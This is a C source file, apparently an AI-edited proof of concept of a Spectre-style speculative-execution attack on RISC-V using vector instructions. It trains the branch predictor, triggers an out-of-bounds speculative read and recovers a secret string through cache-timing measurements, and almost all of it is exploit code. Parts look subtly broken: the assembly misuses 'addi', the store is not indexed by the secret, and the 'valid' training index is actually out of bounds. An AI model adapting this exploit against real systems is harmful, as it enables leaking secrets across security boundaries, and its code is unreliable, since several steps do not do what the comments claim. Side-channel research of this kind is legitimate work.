#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define NUM_TRAIN 6
#define NUM_ROUNDS 1
#define SAME_ATTACK_ROUNDS 10
#define SECRET_LEN 85
#define CACHE_THRESHOLD 50

uint64_t array1_size = 16;
uint8_t padding1[64];
uint8_t array1[160] = {
    1, 2, 3, 4, 5, 6, 7, 8,
    9,10,11,12,13,14,15,16
};
uint8_t padding2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
char* secretStr = "!\"#ThisIsTheSecretString:)abcdefghijklmnopqrtsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!£$%&?*";

/**
 * Finds the top two indices with the highest values in an array.
 * [Function remains the same as your original code]
 */
void findTopTwo(uint64_t* inputArray, uint64_t inputSize, uint8_t* outputIdxArray, uint64_t* outputValArray) {
    outputValArray[0] = 0;
    outputValArray[1] = 0;

    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0];
            outputValArray[0] = inputArray[i];
            outputIdxArray[1] = outputIdxArray[0];
            outputIdxArray[0] = i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i];
            outputIdxArray[1] = i;
        }
    }
}

/**
 * Victim function that speculatively executes vector instructions.
 *
 * @param idx Index used to access the secret array.
 */
void victimFunction(uint64_t idx) {
    // Variables to hold vector data
    volatile uint8_t temp = 0;
    uint64_t bogus_idx = idx;

    // Delay loop to increase speculation window
    for (volatile int z = 0; z < 100; z++) {}

    // Speculative execution starts here
    if (bogus_idx < array1_size) {
        // Use vector instructions
        asm volatile(
            // Set vector length to 16 bytes (adjust based on your configuration)
            "vsetvli zero, zero, e8, m2\n"
            // Load data into vector register v0 speculatively
            "vlb.v v0, (%0)\n"
            // Perform speculative computation
            "addi %1, %1, %2\n"
            "vlb.v v1, (%1)\n"
            // Access array2 based on secret data
            "vsb.v v1, (%3)\n"
            :
            : "r" (&array1[bogus_idx]), "r" (bogus_idx), "r" (0), "r" (&array2[0])
            : "v0", "v1"
        );
    }

    // Serialize execution to prevent reordering
    asm volatile("fence");

    temp += array2[0];  // Prevent optimization
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretStr - (char*)array1);
    uint64_t startTime, duration, inputIdx;
    uint8_t temp = 0;
    static uint64_t results[256];

    for(uint64_t i = 0; i < SECRET_LEN; ++i) {
        // Reset results
        for(uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }

        for(uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {
            // Flush array2 from cache
            flushCache((uint64_t)array2, sizeof(array2));

            // Train the branch predictor
            for(int64_t k = NUM_TRAIN; k > 0; --k) {
                victimFunction(array1_size);  // Valid index
            }

            // Attack
            victimFunction(attackIdx);

            // Measure access times
            for (uint64_t m = 0; m < 256; ++m) {
                startTime = rdcycle();
                temp &= array2[m * L1_BLOCK_SZ_BYTES];
                duration = (rdcycle() - startTime);

                if (duration < CACHE_THRESHOLD) {
                    results[m]++;
                }
            }
        }

        // Find the top two results
        uint8_t bestGuess[2] = {0};
        uint64_t bestHits[2] = {0};
        findTopTwo(results, 256, bestGuess, bestHits);

        printf("m[0x%p] = expected(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", 
            (uint8_t*)(array1 + attackIdx), secretStr[i], bestHits[0], bestGuess[0], bestGuess[0], 
            bestHits[1], bestGuess[1], bestGuess[1]); 

        // Move to the next secret character
        ++attackIdx;
    }

    return 0;
}
